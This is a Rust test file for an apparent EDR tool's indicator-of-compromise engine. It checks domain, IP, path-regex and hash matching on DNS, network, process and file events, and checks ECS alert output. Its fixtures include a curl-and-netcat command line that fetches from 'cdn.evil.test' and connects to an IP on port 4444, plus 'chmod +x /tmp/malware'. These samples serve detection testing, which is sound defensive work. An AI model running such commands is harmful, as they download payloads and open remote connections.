#[cfg(test)]
mod common;

use common::{
    assert_ecs_field_eq, assert_ecs_field_present, dns_query_event, ecs_json, file_create_event,
    network_connect_event, process_start_event, IocFixture, TestNormalizer, TEST_DESTINATION_IP,
    TEST_DOMAIN, TEST_PID,
};
use rustinel::{
    engine::{Engine, EventDetectors},
    ioc::{HashCache, IocEngine, IocKind},
    models::{CanonicalEvent, EventFields, Provenance},
    sensor::Platform,
};
use std::sync::Arc;

#[test]
fn domain_ioc_matches_exact_and_suffix_dns_events() {
    let fixture = IocFixture::new();
    fixture.write_domains(&format!("{TEST_DOMAIN}; exact\n.example.test; suffix\n"));
    let engine = IocEngine::load(&fixture.config());
    let harness = TestNormalizer::new();

    let event = CanonicalEvent::from_normalized(
        harness
            .normalizer
            .normalize(&dns_query_event(Platform::Linux))
            .expect("dns event should normalize"),
    );
    let matches = engine.check_event(&event);
    assert_eq!(matches.len(), 2);
    for (m, comment, line) in [(&matches[0], "exact", 1), (&matches[1], "suffix", 2)] {
        assert_eq!(m.comment.as_deref(), Some(comment));
        assert_eq!(
            m.source,
            fixture.config().domains_path.display().to_string()
        );
        assert_eq!(m.line, line);
    }

    let alert = engine.build_alert_for_match(&matches[0], &event);
    let json = ecs_json(&alert);
    assert_ecs_field_eq(&json, "dns.question.name", TEST_DOMAIN);
    assert_ecs_field_eq(&json, "edr.rule.engine", "Ioc");
    assert!(json["rule.name"]
        .as_str()
        .expect("rule name")
        .starts_with("ioc:domain:"));

    for (query, expected) in [
        (Some("  EXAMPLE.TEST...\t"), 2),
        (Some("example.test"), 2),
        (Some("other.example.test"), 1),
        (Some("notexample.test"), 0),
        (Some("example.test.invalid"), 0),
        (Some("..."), 0),
        (Some(" \t"), 0),
        (None, 0),
    ] {
        let mut normalized = event.clone().into_normalized();
        let rustinel::models::EventFields::DnsQuery(fields) = &mut normalized.fields else {
            panic!("expected DNS fields");
        };
        fields.query_name = query.map(str::to_owned);
        let variant = CanonicalEvent::from_normalized(normalized);
        let matches = engine.check_event(&variant);
        assert_eq!(matches.len(), expected, "query: {query:?}");
        if expected == 2 {
            assert_eq!(matches[0].indicator, TEST_DOMAIN);
            assert_eq!(matches[1].indicator, ".example.test");
            assert!(matches.iter().all(|m| m.observed == TEST_DOMAIN));
        }
    }
}

#[test]
fn ip_ioc_matches_network_and_dns_response_ips() {
    let fixture = IocFixture::new();
    fixture.write_ips(&format!(
        "{TEST_DESTINATION_IP}; exact\n198.51.100.0/24; cidr\n"
    ));
    let engine = IocEngine::load(&fixture.config());
    let harness = TestNormalizer::new();

    let network = CanonicalEvent::from_normalized(
        harness
            .normalizer
            .normalize(&network_connect_event(Platform::Linux))
            .expect("network event should normalize"),
    );
    assert_eq!(engine.check_event(&network).len(), 2);

    let repeated_network = CanonicalEvent::from_normalized(
        harness
            .normalizer
            .normalize(&network_connect_event(Platform::Linux))
            .expect("repeated network event should remain available to IOC detection"),
    );
    assert_eq!(engine.check_event(&repeated_network).len(), 2);

    let dns = CanonicalEvent::from_normalized(
        harness
            .normalizer
            .normalize(&dns_query_event(Platform::Linux))
            .expect("dns event should normalize"),
    );
    let matches = engine.check_event(&dns);
    assert_eq!(matches.len(), 2);
    for (m, comment, line) in [(&matches[0], "exact", 1), (&matches[1], "cidr", 2)] {
        assert_eq!(m.comment.as_deref(), Some(comment));
        assert_eq!(m.source, fixture.config().ips_path.display().to_string());
        assert_eq!(m.line, line);
    }

    let alert = engine.build_alert_for_match(&matches[0], &dns);
    let json = ecs_json(&alert);
    assert_ecs_field_eq(&json, "dns.question.name", TEST_DOMAIN);
    assert_ecs_field_present(&json, "related.ip");

    let mut normalized = dns.clone().into_normalized();
    let rustinel::models::EventFields::DnsQuery(fields) = &mut normalized.fields else {
        panic!("expected DNS fields");
    };
    fields.query_results = Some(format!(
        " ,;\t{TEST_DESTINATION_IP};invalid,\n{TEST_DESTINATION_IP}\u{2003}203.0.113.1;; "
    ));
    let separated = CanonicalEvent::from_normalized(normalized);
    let separated_matches = engine.check_event(&separated);
    let match_identity = |m: &rustinel::ioc::IocMatch| {
        (
            m.kind,
            m.indicator.clone(),
            m.observed.clone(),
            m.source.clone(),
            m.line,
        )
    };
    assert_eq!(
        separated_matches
            .iter()
            .map(match_identity)
            .collect::<Vec<_>>(),
        matches.iter().map(match_identity).collect::<Vec<_>>()
    );
}

#[test]
fn path_regex_ioc_matches_process_and_file_paths() {
    let fixture = IocFixture::new();
    fixture.write_paths_regex(r"(?i)(curl|rustinel-fixture)\.(exe|txt); suspicious path");
    let engine = IocEngine::load(&fixture.config());
    let harness = TestNormalizer::new();

    let process = CanonicalEvent::from_normalized(
        harness
            .normalizer
            .normalize(&process_start_event(Platform::Windows))
            .expect("process event should normalize"),
    );
    let process_matches = engine.check_event(&process);
    assert_eq!(process_matches.len(), 1);
    assert_eq!(
        process_matches[0].comment.as_deref(),
        Some("suspicious path")
    );
    assert_eq!(
        process_matches[0].source,
        fixture.config().paths_regex_path.display().to_string()
    );
    assert_eq!(process_matches[0].line, 1);
    let alert = engine.build_alert_for_match(&process_matches[0], &process);
    assert!(alert
        .rule_description
        .as_deref()
        .expect("description")
        .contains("source:"));
    assert_ecs_field_present(&ecs_json(&alert), "process.executable");

    let file = CanonicalEvent::from_normalized(
        harness
            .normalizer
            .normalize(&file_create_event(Platform::Linux))
            .expect("file event should normalize"),
    );
    let file_matches = engine.check_event(&file);
    assert_eq!(file_matches.len(), 1);
    assert_ecs_field_present(
        &ecs_json(&engine.build_alert_for_match(&file_matches[0], &file)),
        "file.path",
    );
}

#[test]
fn hash_ioc_pipeline_detects_required_hashes_and_respects_limits_and_allowlist() {
    let tempdir = tempfile::tempdir().expect("create hash tempdir");
    let sample = tempdir.path().join("sample.bin");
    std::fs::write(&sample, b"rustinel hash fixture").expect("write sample");

    let mut cache = HashCache::new();
    let requirements = rustinel::ioc::HashRequirements {
        md5: true,
        sha1: true,
        sha256: true,
    };
    let mut buf = [0u8; 8192];
    let hashes = cache
        .get_or_compute(&sample, requirements, &mut buf)
        .expect("compute hashes");

    let fixture = IocFixture::new();
    fixture.write_hashes(&format!(
        "{}; md5\n{}; sha1\n{}; sha256\n",
        hashes.md5.as_deref().unwrap(),
        hashes.sha1.as_deref().unwrap(),
        hashes.sha256.as_deref().unwrap()
    ));
    let mut cfg = fixture.config();
    cfg.max_file_size_mb = 0;
    cfg.hash_allowlist_paths = vec![tempdir.path().display().to_string()];

    let engine = IocEngine::load(&cfg);
    let req = engine.hash_requirements();
    assert!(req.md5 && req.sha1 && req.sha256);
    assert_eq!(engine.max_file_size_bytes(), 0);
    assert!(engine.is_hash_allowlisted(sample.to_str().unwrap()));

    let matches = engine.match_hashes(&hashes);
    assert_eq!(matches.len(), 3);
    for (m, comment, line) in [
        (&matches[0], "md5", 1),
        (&matches[1], "sha1", 2),
        (&matches[2], "sha256", 3),
    ] {
        assert_eq!(m.comment.as_deref(), Some(comment));
        assert_eq!(m.source, fixture.config().hashes_path.display().to_string());
        assert_eq!(m.line, line);
    }
    // The hash job reports the process-start image, so its fidelity must
    // survive the async hop; limitations on fields the alert omits must not.
    let mut provenance = Provenance::default();
    provenance.mark_derived("Image");
    provenance.mark_derived("ParentImage");
    let alert = engine.build_alert_for_hash_match(
        &matches[0],
        sample.to_str().unwrap(),
        TEST_PID,
        &provenance,
        Platform::Linux,
        "ebpf",
    );
    let ecs = ecs_json(&alert);
    assert_ecs_field_eq(&ecs, "edr.rule.engine", "Ioc");
    assert_eq!(
        ecs["edr.event.provenance"],
        serde_json::json!([{ "field": "Image", "fidelity": "derived" }])
    );
}

#[test]
fn domain_metadata_preserves_duplicate_lines_and_optional_comments() {
    let fixture = IocFixture::new();
    fixture.write_domains(&format!(
        "# header\n{TEST_DOMAIN}; repeated; detail\n*.example.test; repeated; detail\n.example.test; \n*.example.test\n"
    ));
    let engine = IocEngine::load(&fixture.config());
    let harness = TestNormalizer::new();
    let event = CanonicalEvent::from_normalized(
        harness
            .normalizer
            .normalize(&dns_query_event(Platform::Linux))
            .expect("DNS event"),
    );
    let matches = engine.check_event(&event);
    assert_eq!(matches.len(), 4);
    for (index, m) in matches.iter().enumerate() {
        assert_eq!(
            m.source,
            fixture.config().domains_path.display().to_string()
        );
        assert_eq!(m.line, index + 2);
        assert_eq!(
            m.comment.as_deref(),
            if index < 2 {
                Some("repeated; detail")
            } else {
                None
            }
        );
    }
}

/// A Linux process start whose command line is exactly `command_line`, run from
/// `cwd`.
fn linux_process(command_line: &str, cwd: Option<&str>) -> CanonicalEvent {
    let harness = TestNormalizer::new();
    let mut normalized = harness
        .normalizer
        .normalize(&process_start_event(Platform::Linux))
        .expect("process event should normalize");
    let EventFields::ProcessCreation(fields) = &mut normalized.fields else {
        panic!("expected process fields");
    };
    fields.image = Some("/usr/bin/chmod".to_string());
    fields.parent_image = Some("/usr/bin/bash".to_string());
    fields.command_line = Some(command_line.to_string());
    fields.current_directory = cwd.map(str::to_owned);
    CanonicalEvent::from_normalized(normalized)
}

#[test]
fn relative_command_line_operands_alert_like_their_absolute_form() {
    // #231 Cases 3 and 4: `chmod +x /tmp/malware`, then `cd /tmp` and
    // `chmod +x malware`. Both name the same file, so both must alert, and
    // each alert must still report the command line exactly as it was run.
    let fixture = IocFixture::new();
    fixture.write_paths_regex("^/tmp/malware$; staged payload\n");
    let detectors = EventDetectors::new(
        Arc::new(Engine::new_for_platform(Platform::Linux)),
        Arc::new(IocEngine::load(&fixture.config())),
    );

    for command_line in ["chmod +x /tmp/malware", "chmod +x malware"] {
        let event = linux_process(command_line, Some("/tmp"));
        let alerts = detectors.evaluate(&event);
        assert_eq!(alerts.len(), 1, "{command_line}");

        let alert = &alerts[0];
        assert_eq!(alert.rule_name, "ioc:path_regex:^/tmp/malware$");
        assert!(alert
            .rule_description
            .as_deref()
            .is_some_and(|description| description.contains("observed: /tmp/malware")));
        assert_eq!(alert.event.get_field("CommandLine"), Some(command_line));
        assert_ecs_field_eq(&ecs_json(alert), "process.command_line", command_line);
    }

    // Without a working directory there is nothing honest to resolve against.
    assert!(detectors
        .evaluate(&linux_process("chmod +x malware", None))
        .is_empty());
}

#[test]
fn previously_unchecked_fields_reach_every_indicator_kind() {
    let fixture = IocFixture::new();
    fixture.write_paths_regex("^/usr/bin/bash$; parent\n^/tmp/staged$; rename source\n");
    fixture.write_domains(".evil.test; c2\n");
    fixture.write_ips("203.0.113.0/24; c2 range\n");
    let engine = IocEngine::load(&fixture.config());
    let harness = TestNormalizer::new();

    let process = linux_process(
        "sh -c curl -o payload https://cdn.evil.test/x | nc 203.0.113.5 4444",
        Some("/home/user"),
    );
    let kinds: Vec<(IocKind, String)> = engine
        .check_event(&process)
        .into_iter()
        .map(|m| (m.kind, m.observed))
        .collect();
    assert_eq!(
        kinds,
        [
            (IocKind::Domain, "cdn.evil.test".to_string()),
            (IocKind::Ip, "203.0.113.5".to_string()),
            (IocKind::PathRegex, "/usr/bin/bash".to_string()),
        ]
    );

    let mut rename = harness
        .normalizer
        .normalize(&file_create_event(Platform::Linux))
        .expect("file event should normalize");
    let EventFields::FileEvent(fields) = &mut rename.fields else {
        panic!("expected file fields");
    };
    fields.source_filename = Some("/tmp/staged".to_string());
    let matches = engine.check_event(&CanonicalEvent::from_normalized(rename));
    assert_eq!(matches.len(), 1);
    assert_eq!(matches[0].observed, "/tmp/staged");
}
